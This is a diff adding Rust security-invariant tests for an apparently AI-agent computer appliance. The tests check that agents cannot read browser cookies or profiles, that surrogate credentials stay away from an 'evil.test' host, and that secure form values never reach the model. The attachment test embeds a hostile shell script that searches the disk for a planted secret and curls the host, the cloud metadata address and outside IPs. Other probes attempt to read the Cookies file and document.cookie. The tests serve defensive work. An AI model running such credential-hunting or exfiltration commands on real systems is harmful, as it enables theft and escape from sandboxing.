@@ -1,0 +1,426 @@
+diff --git a/tests/invariants/src/computerd.rs b/tests/invariants/src/computerd.rs
+index cb9e277..cc49a4e 100644
+--- a/tests/invariants/src/computerd.rs
++++ b/tests/invariants/src/computerd.rs
+@@ -35,7 +35,7 @@ impl Computerd {
+         let group = Command::new("getent").args(["group", "magnus"]).output().expect("getent");
+         let gid = String::from_utf8_lossy(&group.stdout).split(':').nth(2).expect("the magnus group exists").to_string();
+         let config = format!(
+-            "state_dir = \"{s}\"\nsocket = \"{k}\"\nsocket_gid = {gid}\njailer = \"/usr/local/bin/jailer\"\nfirecracker = \"/usr/local/bin/firecracker\"\nfirst_uid = 220000\nmax_computers = 8\nmax_live = 4\n[vm]\nvcpus = 1\nmemory_mib = 256\ncpu_percent = 100\npids_max = 128\nvolume_gib = 1\noverlay_gib = 1\n",
++            "state_dir = \"{s}\"\nsocket = \"{k}\"\nsocket_gid = {gid}\njailer = \"/usr/local/bin/jailer\"\nfirecracker = \"/usr/local/bin/firecracker\"\nfirst_uid = 220000\nmax_computers = 8\nmax_live = 4\n[vm]\nvcpus = 1\nmemory_mib = 1024\ncpu_percent = 100\npids_max = 128\nvolume_gib = 1\noverlay_gib = 1\n",
+             s = state.display(),
+             k = socket.display(),
+         );
+@@ -110,6 +110,31 @@ impl Computerd {
+         reply["stdout"].as_str().unwrap_or_default().to_string()
+     }
+ 
++    /// Whether a sealed volume reads as holding `secret`, in any encoding.
++    pub fn sealed_holds(&self, id: &str, secret: &str) -> bool {
++        self.file_holds(&self.state.join("computers").join(id).join("volume.sealed"), secret)
++    }
++    /// computerd's reply, whether it agreed or not.
++    pub fn try_ask(&self, req: Value) -> Value {
++        let mut conn = UnixStream::connect(&self.socket).expect("reach computerd");
++        writeln!(conn, "{req}").expect("ask computerd");
++        let mut line = String::new();
++        BufReader::new(conn).read_line(&mut line).expect("hear computerd");
++        serde_json::from_str(&line).expect("computerd's reply")
++    }
++    /// What the guest answers to one request, whatever it is.
++    pub fn guest(&self, id: &str, req: Value) -> Value {
++        let mut conn = UnixStream::connect(&self.socket).expect("reach computerd");
++        writeln!(conn, "{}", json!({ "op": "connect", "id": id })).expect("connect");
++        let mut from = BufReader::new(conn.try_clone().expect("clone"));
++        let mut ack = String::new();
++        from.read_line(&mut ack).expect("hear the relay");
++        assert!(ack.contains("true"), "{ack}");
++        writeln!(conn, "{req}").expect("send");
++        let mut line = String::new();
++        from.read_line(&mut line).expect("hear the guest");
++        serde_json::from_str(&line).expect("the guest's reply")
++    }
+     /// As root in the guest, with a shell. Returns what it printed.
+     pub fn root_shell(&self, id: &str, script: &str) -> String {
+         self.exec(id, script)
+diff --git a/tests/invariants/src/web.rs b/tests/invariants/src/web.rs
+index 55fe054..f9ccccc 100644
+--- a/tests/invariants/src/web.rs
++++ b/tests/invariants/src/web.rs
+@@ -4,6 +4,8 @@
+ use axum::{
+     extract::State,
+     http::Uri,
++    http::header::{AUTHORIZATION, COOKIE, SET_COOKIE},
++    http::HeaderMap,
+     response::{Html, IntoResponse, Redirect, Response},
+     routing::any,
+     Router,
+@@ -16,6 +18,16 @@ use std::{
+ struct Inner {
+     pages: HashMap<String, String>,
+     hits: Mutex<Vec<String>>,
++    seen: Mutex<Vec<Seen>>,
++}
++
++/// One request as the site saw it.
++#[derive(Clone, Debug)]
++pub struct Seen {
++    pub path: String,
++    pub cookie: Option<String>,
++    pub authorization: Option<String>,
++    pub body: String,
+ }
+ 
+ #[derive(Clone)]
+@@ -26,7 +38,7 @@ pub struct FakeWeb {
+ 
+ impl FakeWeb {
+     pub async fn start(pages: &[(&str, &str)]) -> Self {
+-        let inner = Arc::new(Inner { pages: pages.iter().map(|(p, h)| (p.to_string(), h.to_string())).collect(), hits: Mutex::new(vec![]) });
++        let inner = Arc::new(Inner { pages: pages.iter().map(|(p, h)| (p.to_string(), h.to_string())).collect(), seen: Mutex::new(vec![]), hits: Mutex::new(vec![]) });
+         let app = Router::new().fallback(any(page)).with_state(inner.clone());
+         let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+         let base = format!("http://{}", listener.local_addr().unwrap());
+@@ -38,16 +50,27 @@ impl FakeWeb {
+         format!("{}{}", self.base, path)
+     }
+ 
++    /// Every request, with the headers a credential travels in.
++    pub fn seen(&self) -> Vec<Seen> {
++        self.inner.seen.lock().unwrap().clone()
++    }
+     /// Every path-and-query requested, in order.
+     pub fn hits(&self) -> Vec<String> {
+         self.inner.hits.lock().unwrap().clone()
+     }
+ }
+ 
+-/// A page whose text is `redirect:<url>` redirects there.
+-async fn page(State(inner): State<Arc<Inner>>, uri: Uri) -> Response {
+-    inner.hits.lock().unwrap().push(uri.path_and_query().map(|p| p.to_string()).unwrap_or_default());
++/// A page whose text is `redirect:<url>` redirects there, and one that starts
++/// `cookie:<value>|` sets that cookie.
++async fn page(State(inner): State<Arc<Inner>>, uri: Uri, headers: HeaderMap, body: String) -> Response {
++    let path = uri.path_and_query().map(|p| p.to_string()).unwrap_or_default();
++    let header = |name| headers.get(name).and_then(|v: &axum::http::HeaderValue| v.to_str().ok()).map(String::from);
++    inner.seen.lock().unwrap().push(Seen { path: path.clone(), cookie: header(COOKIE), authorization: header(AUTHORIZATION), body });
++    inner.hits.lock().unwrap().push(path);
+     let text = inner.pages.get(uri.path()).cloned().unwrap_or_else(|| "<html>not found</html>".into());
++    if let Some((cookie, html)) = text.strip_prefix("cookie:").and_then(|t| t.split_once('|')) {
++        return ([(SET_COOKIE, cookie.to_string())], Html(html.to_string())).into_response();
++    }
+     match text.strip_prefix("redirect:") {
+         Some(to) => Redirect::temporary(to).into_response(),
+         None => Html(text).into_response(),
+diff --git a/tests/invariants/tests/inv2_credentials.rs b/tests/invariants/tests/inv2_credentials.rs
+index 3442198..f80ebc7 100644
+--- a/tests/invariants/tests/inv2_credentials.rs
++++ b/tests/invariants/tests/inv2_credentials.rs
+@@ -165,3 +165,306 @@ async fn capture_stops_and_the_agent_pauses_while_a_person_holds_control() {
+     let (_, activity) = alice.get(&format!("/v1/computers/{id}/activity")).await;
+     assert!(activity.to_string().contains("took control") && activity.to_string().contains("handed back"), "the log does not show the takeover: {activity}");
+ }
++
++// Step 7: browser VMs and credentials. Each needs real VMs.
++
++const SITE_PROXY: &str = "http://10.200.0.1:3128";
++
++fn bare(site: &FakeWeb) -> String {
++    site.base.trim_start_matches("http://").to_string()
++}
++
++/// A model that opens a task, then runs `calls` in order, then finishes.
++fn model_steps(identity: &str, calls: Vec<(&str, serde_json::Value)>) -> magnus_invariants::model::Script {
++    let mut replies = vec![contract_unchecked("use the browser", "done")];
++    for (name, mut input) in calls {
++        if input.get("identity").is_some() {
++            input["identity"] = json!(identity);
++        }
++        replies.push(tool(name, input));
++    }
++    replies.push(complete("done"));
++    steps(replies)
++}
++
++async fn identity_of(app: &Appliance, site: &str) -> String {
++    let (code, made) = app.api("alice").post("/v1/identities", json!({ "site": site })).await;
++    assert!(code.is_success(), "{made}");
++    made["id"].as_str().unwrap().to_string()
++}
++
++fn permits(tools: &[&str]) -> String {
++    org_policy(&tools.iter().map(|t| permit_execute(t)).collect::<Vec<_>>().join("\n"))
++}
++
++#[tokio::test(flavor = "multi_thread")]
++async fn the_agent_cannot_reach_a_browser_vm_or_its_profile() {
++    let computerd = Computerd::start();
++    let session = canary("session-cookie");
++    let site = FakeWeb::start(&[("/login", &*format!("cookie:session={session}; Path=/|<html><p>signed in</p></html>"))]).await;
++    let model = FakeModel::start(steps(vec![])).await;
++    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
++    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
++    let alice = app.api("alice");
++    let identity = identity_of(&app, "acct.test").await;
++    model.set_script(model_steps(&identity, vec![("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" }))]));
++    assert!(alice.put_policy("org", &permits(&["browser_as_navigate"])).await.is_success());
++    let task = alice.submit("Open my account page.").await;
++    alice.wait_settled(&task).await;
++    assert!(site.seen().iter().any(|s| s.path == "/login"), "the page was never loaded: {:?} {:?}", site.hits(), model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text).collect::<Vec<_>>());
++
++    // The guest offers page commands and nothing else.
++    for req in [
++        json!({ "op": "exec", "command": "cat /workspace/profile/Default/Cookies", "timeout_s": 10 }),
++        json!({ "op": "read", "path": "/workspace/profile/Default/Cookies" }),
++        json!({ "op": "write", "path": "/tmp/x", "data_b64": "eA==" }),
++        json!({ "op": "evaluate", "script": "document.cookie" }),
++        json!({ "op": "cookies" }),
++        json!({ "op": "storage_state" }),
++        json!({ "op": "devtools" }),
++    ] {
++        let reply = computerd.guest(&identity, req.clone());
++        assert!(reply["error"].is_string(), "the agent reached a profile through {req}: {reply}");
++        assert!(!reply.to_string().contains(&session), "the agent reached a profile through {req}");
++    }
++    // The person's own computer: the same routes, and no road to the VM.
++    for path in [format!("/v1/computers/{identity}"), format!("/v1/computers/{identity}/files?path=/workspace/profile/Default/Cookies")] {
++        assert_eq!(alice.get(&path).await.0, 404, "the agent reached a profile through {path}");
++    }
++    let (_, made) = alice.post("/v1/computers", json!({})).await;
++    let computer = made["id"].as_str().unwrap().to_string();
++    assert_eq!(alice.post(&format!("/v1/computers/{computer}/start"), json!({})).await.0, 200);
++    let tried = computerd.root_shell(&computer, &format!("curl -s -m 5 -o /dev/null -w '%{{http_code}}' -x {SITE_PROXY} http://10.200.0.2:52/; echo; curl -s -m 5 --noproxy '*' -o /dev/null -w '%{{http_code}}' http://10.200.0.2:52/; echo"));
++    assert!(tried.lines().all(|code| code != "200"), "the agent reached a profile through the network: {tried}");
++
++    let dump = app.db.dump().await;
++    for (i, r) in model.requests().iter().enumerate() {
++        assert!(!scan::contains(r.text().as_bytes(), &session), "the agent reached a profile through model request {i}");
++    }
++    assert!(!scan::contains(dump.as_bytes(), &session), "the session is in the database");
++    assert!(!scan::contains(app.logs().as_bytes(), &session), "the session is in the appliance's output");
++    assert!(!computerd.volume_holds(&computer, &session), "the agent reached a profile through its computer's disk");
++
++    // Stopped behind Magnus's back, the profile is sealed by the idle loop,
++    // unreadable at rest, and a stranger's key does not open it.
++    use base64::Engine;
++    computerd.guest(&identity, json!({ "op": "sync" }));
++    computerd.ask(json!({ "op": "stop", "id": identity }));
++    let sealed = std::time::Instant::now();
++    while computerd.volume_exists(&identity) {
++        assert!(sealed.elapsed() < std::time::Duration::from_secs(240), "the profile stayed in plain form");
++        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
++    }
++    assert!(!computerd.sealed_holds(&identity, &session), "the session is readable in the sealed profile");
++    let stranger = base64::engine::general_purpose::STANDARD.encode([8u8; 32]);
++    assert_eq!(computerd.try_ask(json!({ "op": "unseal_volume", "id": identity, "key_b64": stranger }))["ok"], false, "a wrong key opened the profile");
++}
++
++#[tokio::test(flavor = "multi_thread")]
++async fn untrusted_reading_uses_a_browser_with_no_profile() {
++    let computerd = Computerd::start();
++    let session = canary("session");
++    let site = FakeWeb::start(&[
++        ("/login", &*format!("cookie:session={session}; Path=/|<html><p>in</p></html>")),
++        ("/signed", "<html><p>your account</p></html>"),
++        ("/public", "<html><p>a public page</p></html>"),
++    ])
++    .await;
++    let model = FakeModel::start(steps(vec![])).await;
++    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
++    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
++    let alice = app.api("alice");
++    let identity = identity_of(&app, "acct.test").await;
++    model.set_script(model_steps(
++        &identity,
++        vec![
++            ("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" })),
++            ("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/signed" })),
++        ],
++    ));
++    assert!(alice.put_policy("org", &permits(&["browser_as_navigate", "browser_navigate"])).await.is_success());
++    let task = alice.submit("Read this site.").await;
++    alice.wait_settled(&task).await;
++    // A task of its own: a run holding signed-in pages rightly asks before it
++    // goes to the open web.
++    model.set_script(model_steps(&identity, vec![("browser_navigate", json!({ "url": "http://acct.test/public" }))]));
++    let task = alice.submit("Read the public page.").await;
++    alice.wait_settled(&task).await;
++    let seen = site.seen();
++    let signed = seen.iter().find(|s| s.path == "/signed").unwrap_or_else(|| panic!("the identity did not open its page: {:?}", model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text.chars().take(240).collect::<String>()).collect::<Vec<_>>()));
++    assert!(signed.cookie.as_deref().unwrap_or_default().contains(&session), "the identity's own browser lost its login: {signed:?}");
++    let public = seen.iter().find(|s| s.path == "/public").expect("the throwaway browser did not open the page");
++    assert_eq!(public.cookie, None, "untrusted reading carried a login: {public:?}");
++}
++
++#[tokio::test(flavor = "multi_thread")]
++async fn a_surrogate_becomes_the_real_credential_only_after_approval_and_only_at_its_destination() {
++    let computerd = Computerd::start();
++    let real = canary("real-token");
++    let site = FakeWeb::start(&[("/allowed", "<html>ok</html>"), ("/denied", "<html>no</html>")]).await;
++    let other = FakeWeb::start(&[("/stolen", "<html>got it</html>")]).await;
++    let model = FakeModel::start(steps(vec![])).await;
++    let spec = Spec::default().computer_options(json!({ "public_hosts": { "app.test": [bare(&site)], "evil.test": [bare(&other)] } }));
++    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
++    let alice = app.api("alice");
++    let (_, made) = alice.post("/v1/computers", json!({})).await;
++    let id = made["id"].as_str().unwrap().to_string();
++    assert_eq!(alice.post(&format!("/v1/computers/{id}/start"), json!({})).await.0, 200);
++    let (code, issued) = alice.post(&format!("/v1/computers/{id}/surrogates"), json!({ "name": "app", "value": real, "host": "app.test" })).await;
++    assert!(code.is_success(), "{issued}");
++    let surrogate = issued["surrogate"].as_str().unwrap().to_string();
++    for host in ["app.test", "evil.test"] {
++        assert!(alice.post(&format!("/v1/computers/{id}/destinations"), json!({ "host": host })).await.0.is_success());
++    }
++    let call = |host: &str, path: &str| computerd.root_shell(&id, &format!("curl -s -m 20 -o /dev/null -w '%{{http_code}}' -x {SITE_PROXY} -H 'Authorization: Bearer {surrogate}' http://{host}{path}"));
++
++    assert_eq!(call("app.test", "/allowed"), "200", "an allowed request failed");
++    let got = site.seen();
++    let allowed = got.iter().find(|s| s.path == "/allowed").expect("the app was not reached");
++    assert_eq!(allowed.authorization.as_deref(), Some(format!("Bearer {real}").as_str()), "the app did not get the real credential");
++
++    model.set_reviewer(script(|_| async { review("deny", "not this request") }));
++    assert_ne!(call("app.test", "/denied"), "200", "a denied request went through");
++    assert!(!site.hits().iter().any(|p| p == "/denied"), "the real credential left without approval");
++
++    model.set_reviewer(script(|_| async { review("allow", "fine") }));
++    assert_ne!(call("evil.test", "/stolen"), "200", "the surrogate worked at another host");
++    assert!(other.seen().is_empty(), "the real credential left without approval: {:?}", other.seen());
++
++    assert!(!computerd.volume_holds(&id, &real), "the real credential is on the computer");
++    let found = computerd.root_shell(&id, &format!("grep -rl '{real}' /workspace /etc /root /tmp 2>/dev/null; echo done"));
++    assert_eq!(found.trim(), "done", "the real credential is in the computer: {found}");
++    let dump = app.db.dump().await;
++    assert!(!scan::contains(dump.as_bytes(), &real), "the real credential is in the database");
++    assert!(!scan::contains(app.logs().as_bytes(), &real), "the real credential is in the appliance's output");
++}
++
++#[tokio::test(flavor = "multi_thread")]
++async fn a_secure_form_value_reaches_neither_the_model_nor_the_log() {
++    let computerd = Computerd::start();
++    let secret = canary("secure-form");
++    let site = FakeWeb::start(&[
++        ("/login", r#"<html><form action="/in" method="get"><input name="pw" placeholder="Password"></form></html>"#),
++        ("/in", "<html><p>welcome back</p></html>"),
++    ])
++    .await;
++    let model = FakeModel::start(steps(vec![])).await;
++    let spec = Spec::default().computer_options(json!({ "public_hosts": { "acct.test": [bare(&site)] } }));
++    let app = Appliance::start(spec.computer(&computerd.socket), &model).await;
++    let alice = app.api("alice");
++    let identity = identity_of(&app, "acct.test").await;
++    model.set_script(model_steps(
++        &identity,
++        vec![
++            ("browser_as_navigate", json!({ "identity": "", "url": "http://acct.test/login" })),
++            ("browser_sign_in", json!({ "identity": "", "password_field": "e1" })),
++        ],
++    ));
++    assert!(alice.put_policy("org", &permits(&["browser_as_navigate", "browser_sign_in", "browser_as_snapshot"])).await.is_success());
++    let task = alice.submit("Sign in to my account.").await;
++    alice.wait_settled(&task).await;
++    let (code, filled) = alice.post(&format!("/v1/identities/{identity}/secure-form"), json!({ "target": "e1", "value": secret, "submit": true })).await;
++    assert!(code.is_success(), "the secure form was refused: {filled}");
++    assert!(site.hits().iter().any(|p| p.starts_with("/in?") && p.contains(&secret)), "the value never reached the page: {:?}", site.hits());
++
++    model.set_script(model_steps(&identity, vec![("browser_as_snapshot", json!({ "identity": "" }))]));
++    let task = alice.submit("Look at the page now.").await;
++    alice.wait_settled(&task).await;
++    let results: Vec<String> = model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text).collect();
++    assert!(results.iter().any(|t| t.contains("welcome back")), "the page after the form was not read: {results:?}");
++
++    for (i, r) in model.requests().iter().enumerate() {
++        assert!(!scan::contains(r.text().as_bytes(), &secret), "a secure form value reached model request {i}");
++    }
++    assert!(!scan::contains(app.db.dump().await.as_bytes(), &secret), "a secure form value reached the log");
++    assert!(!scan::contains(app.logs().as_bytes(), &secret), "a secure form value reached the appliance's output");
++    let files = scan::files_containing(&app.state_dir, &secret);
++    assert!(files.is_empty(), "a secure form value reached a file: {files:?}");
++}
++
++/// Every file and directory name under `root`.
++fn walkdir_names(root: &std::path::Path) -> Vec<String> {
++    let mut names = vec![];
++    let mut dirs = vec![root.to_path_buf()];
++    while let Some(d) = dirs.pop() {
++        for e in std::fs::read_dir(&d).into_iter().flatten().flatten() {
++            names.push(e.file_name().to_string_lossy().into_owned());
++            if e.file_type().is_ok_and(|t| t.is_dir()) {
++                dirs.push(e.path());
++            }
++        }
++    }
++    names
++}
++
++#[tokio::test(flavor = "multi_thread")]
++async fn an_attachment_opens_only_in_a_per_run_sandbox() {
++    use base64::Engine;
++    let computerd = Computerd::start();
++    let on_volume = canary("user-volume");
++    let extracted = canary("extracted");
++    let public = FakeWeb::start(&[("/", "<html>reached</html>")]).await;
++    let host_ip = String::from_utf8(std::process::Command::new("hostname").arg("-I").output().unwrap().stdout).unwrap().split_whitespace().next().unwrap().to_string();
++    let port = public.base.rsplit(':').next().unwrap().to_string();
++    // Split, so the script does not contain what it looks for.
++    let (head, tail) = on_volume.split_at(on_volume.len() / 2);
++    let attack = format!(
++        r#"#!/bin/sh
++echo {extracted}
++ls -la /workspace /workspace/* 2>&1
++A={head}; B={tail}; grep -rl "$A$B" / 2>/dev/null --exclude-dir=proc --exclude-dir=sys && echo FOUND-CANARY
++ls /workspace/profile 2>/dev/null && echo FOUND-PROFILE
++for target in {host_ip}:{port} 127.0.0.1:{port} 169.254.169.254:80 10.200.0.1:3128 1.1.1.1:80; do
++  curl -s -m 3 -o /dev/null http://$target/ && echo REACHED-$target
++done
++getent hosts example.com && echo RESOLVED-NAME
++ip -o link | grep -v ' lo:' | head -3
++"#
++    );
++    let model = FakeModel::start(steps(vec![])).await;
++    let app = Appliance::start(Spec::default().computer(&computerd.socket), &model).await;
++    let alice = app.api("alice");
++    let (_, made) = alice.post("/v1/computers", json!({})).await;
++    let computer = made["id"].as_str().unwrap().to_string();
++    assert_eq!(alice.post(&format!("/v1/computers/{computer}/start"), json!({})).await.0, 200);
++    let data = base64::engine::general_purpose::STANDARD.encode(on_volume.as_bytes());
++    assert!(alice.put(&format!("/v1/computers/{computer}/files"), json!({ "path": "/workspace/secret.txt", "data_b64": data })).await.0.is_success());
++    model.set_script(steps(vec![
++        contract_unchecked("read the attachment", "read"),
++        tool("sandbox_exec", json!({ "command": "ls -la /workspace /workspace/inputs 2>&1; echo LISTED-WORK" })),
++        tool("open_attachment", json!({ "name": "evil.sh", "command": "sh /workspace/inputs/attachment" })),
++        complete("done"),
++    ]));
++    let file = base64::engine::general_purpose::STANDARD.encode(attack.as_bytes());
++    let (code, made) = alice.post("/v1/tasks", json!({ "text": "Read the attachment from this email.", "from_outside": [{ "name": "evil.sh", "media_type": "text/x-shellscript", "data_b64": file }] })).await;
++    assert!(code.is_success(), "{made}");
++    let task = made["task_id"].as_str().unwrap().to_string();
++    alice.wait_settled(&task).await;
++    assert_eq!(public.hits().len(), 0, "the attachment reached the public site");
++    let reqs = model.requests();
++    let result = reqs.iter().rev().flat_map(|r| r.last_results()).map(|r| r.text).find(|t| t.contains(&extracted)).unwrap_or_else(|| panic!("the attachment did not run: {:?}", model.requests().iter().flat_map(|r| r.last_results()).map(|r| r.text.chars().take(240).collect::<String>()).collect::<Vec<_>>()));
++    for bad in ["FOUND-CANARY", "FOUND-PROFILE", "REACHED-", "RESOLVED-NAME", "eth0"] {
++        assert!(!result.contains(bad), "the attachment reached the user volume or a profile, or the network ({bad}): {result}");
++    }
++    let listing = reqs.iter().flat_map(|r| r.last_results()).map(|r| r.text).find(|t| t.contains("LISTED-WORK")).expect("the run's workspace was not listed");
++    assert!(!listing.contains("evil.sh"), "the attachment entered the run's own workspace: {listing}");
++    let left: Vec<_> = walkdir_names(&app.state_dir).into_iter().filter(|n| n.starts_with("attachment-")).collect();
++    assert!(left.is_empty(), "the attachment's sandbox was left behind: {left:?}");
++    let first = reqs.first().unwrap();
++    assert!(!first.text().contains(&extracted), "the file's content was given to the model without opening it");
++    for r in &reqs {
++        for m in r.messages() {
++            let text = m.to_string();
++            if text.contains(&extracted) {
++                assert!(text.contains("tool_result"), "the extracted text was not quoted data: {text}");
++            }
++        }
++    }
++    assert_eq!(alice.task(&task).await["taint"]["untrusted"], json!(true), "the extracted text was not quoted data: the run is not tainted");
++    let (_, listing) = alice.get(&format!("/v1/computers/{computer}/files?path=/workspace/attachments/evil.sh")).await;
++    assert!(!listing.to_string().contains("data_b64"), "the file was saved without the user: {listing}");
++    let (code, saved) = alice.post(&format!("/v1/tasks/{task}/attachments/evil.sh/save"), json!({})).await;
++    assert!(code.is_success(), "the user could not save the file: {saved}");
++    let (code, listing) = alice.get(&format!("/v1/computers/{computer}/files?path=/workspace/attachments/evil.sh")).await;
++    assert_eq!(code, 200, "the saved file is not on the volume: {listing}");
++}
